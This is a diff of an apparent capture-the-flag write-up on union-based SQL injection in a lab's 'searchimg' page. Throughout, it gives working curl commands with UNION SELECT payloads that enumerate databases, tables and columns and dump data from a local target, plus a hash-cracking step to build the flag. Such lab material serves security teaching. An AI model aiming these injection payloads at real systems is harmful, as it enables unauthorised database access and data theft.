@@ -1,4 +1,4 @@
-# Exercise Name
+# Union Based SQL Injection in search image page
 
 ## 📖 Vulnerability Explanation
 [Explain what the vulnerability is, how it works, and why it's dangerous. Include conditions required for exploitation if applicable.]
@@ -12,7 +12,7 @@
 ```
 
 ```
-curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+1%2Cschema_name+FROM+information_schema.schemata%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.*<br\/>//' | sed 's/<\/pre>//' | grep -v table | awk '{print $3}'
+curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+1%2Cschema_name+FROM+information_schema.schemata%3B+--+-&Submit=Submit#' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.*<br\/>Title: //' | sed 's/<br\/>.*//'
 ```
 
 ---
@@ -24,12 +24,12 @@ curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+1%2Cschema_name+FR
 ```
 
 ```
-curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+table_schema%2Ctable_name+FROM+information_schema.tables%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/First name: /\n[+] Database   : /' | sed 's/Surname : /[-] Table name : /' | grep -v table
+curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+table_name%2Ctable_schema+FROM+information_schema.tables%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: /\n[+] Database   : /' | sed 's/Url : /[-] Table name : /' | grep -v table
 ```
 
 ---
 
-- Dump columns of table images
+- Dump columns of table _list\_images_
 
 ```
 echo -n 'list_images' | xxd -p
@@ -48,19 +48,29 @@ curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+1%2Cco
 - Read columns _title_ and _comment_
 
 ```
-a
+0 UNION SELECT title,comment FROM Member_images.list_images; -- -
 ```
 
-> TAKE A LOOK AT THE PAGE YOU ARE SENDING THE REQUESTS TO
+```
+curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+title%2Ccomment+FROM+Member_images.list_images%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: /\n[+] Title   : /' | sed 's/Url : /[-] Comment : /' | grep -v table
+```
 
-> MAKE SURE THE SQLi AND THE REQUEST MATCH
+---
+
+- Crack the hash and craft the flag using the steps provided
+
+> IMAGE crakstation.net
+
+```
+echo -n 'albatroz' | sha256sum
+```
 
 ## 🧰 Additional Resources Used
-- [Tool/Script Name]: [Brief description of purpose]
-- Example: *Custom Python script to exploit XXE and read arbitrary files from the server.*
+
+We used ```https://crackstation.net/``` to crack the hash. This page doesn't really _crack_ the hash you provide, but performs a lookup on pre-computed hashes instead.
 
 ## 🔧 Fix
 [Describe how to fix the vulnerability]
 
 ## ☝️🤓 Advanced explanation
-[Provide advanced explanation for the bonus part]
+While these SQLi allowed us to read most of data present in the database, we could not read everything. After trying to read the database _Member\_Brute\_Force_, we got an error as the account used by the app on these pages did not have access to it.
